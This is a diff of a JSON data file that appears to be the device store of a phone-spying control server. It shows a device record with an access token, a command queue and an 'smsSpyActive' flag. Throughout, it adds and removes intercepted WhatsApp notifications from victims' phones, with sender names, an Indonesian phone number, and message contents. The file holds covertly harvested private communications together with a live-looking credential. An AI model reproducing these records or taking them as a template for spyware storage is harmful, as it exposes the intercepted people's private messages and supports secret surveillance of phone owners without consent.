@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776909557418,
+    "lastSeen": 1776913534600,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "prily 🤍",
+        "content": "Memanggil…",
+        "time": "23/04 11:05",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776913536821
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4011,14 +4019,6 @@
         "time": "23/04 04:33",
         "pkg": "com.whatsapp",
         "receivedAt": 1776890013019
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "+62 822-6965-3769",
-        "content": "11.800 2u1b, 20.800 semi 1b, 17.800 1u1b",
-        "time": "23/04 04:33",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776890013000
       }
     ],
     "galleryPhotos": [],
@@ -9969,6 +9969,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎201 pesan dari 4 chat",
+        "time": "23/04 11:05",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776913521080
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎Senam Rappocini (10 pesan): ~ .",
